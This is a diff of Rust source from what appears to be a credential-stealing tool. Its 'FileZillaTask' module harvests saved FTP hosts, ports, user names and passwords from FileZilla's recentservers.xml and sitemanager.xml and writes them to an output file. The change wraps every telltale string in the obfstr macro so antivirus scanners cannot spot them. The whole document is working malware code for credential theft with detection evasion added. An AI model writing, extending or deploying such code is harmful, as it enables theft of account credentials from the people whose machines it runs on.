@@ -6,6 +6,7 @@ use utils::path::{Path, WriteToFile};
 use windows::core::HSTRING;
 use windows::Data::Xml::Dom::XmlDocument;
 use utils::base64::base64_decode;
+use obfstr::obfstr as s;
 
 pub(super) struct FileZillaTask;
 
@@ -43,18 +44,18 @@ impl Task for FileZillaTask {
             )
         }).collect::<Vec<_>>().join("\n\n");
 
-        let output = parent / "FileZilla.txt";
+        let output = parent / s!("FileZilla.txt");
         let _ = servers.write_to(&output);
     }
 }
 
 fn collect_servers() -> Vec<Server> {
     let mut result: Vec<Server> = Vec::new();
-    let base = &Path::appdata() / "FileZilla";
+    let base = &Path::appdata() / s!("FileZilla");
 
     let paths = [
-        (&base / "recentservers.xml", "RecentServers"),
-        (&base / "sitemanager.xml", "Servers"),
+        (&base / s!("recentservers.xml"), "RecentServers"),
+        (&base / s!("sitemanager.xml"), "Servers"),
     ];
 
     for (path, servers_node) in paths {
@@ -91,7 +92,7 @@ where
     let root = xml_doc.DocumentElement().ok()?;
     let servers = root.SelectSingleNode(&HSTRING::from(servers_node.as_ref())).ok()?;
 
-    let nodes = servers.SelectNodes(&HSTRING::from("Server")).ok()?;
+    let nodes = servers.SelectNodes(&HSTRING::from(s!("Server"))).ok()?;
 
     for i in 0..nodes.Length().ok()? {
         let server = nodes.Item(i).ok()?;
@@ -104,10 +105,10 @@ where
             }
         };
 
-        let host = get_text("Host")?;
-        let port = get_text("Port")?.parse::<u16>().unwrap_or(0);
-        let user = get_text("User")?;
-        let password = get_text("Pass")?;
+        let host = get_text(s!("Host"))?;
+        let port = get_text(s!("Port"))?.parse::<u16>().unwrap_or(0);
+        let user = get_text(s!("User"))?;
+        let password = get_text(s!("Pass"))?;
 
         result.push(Server {
             host,
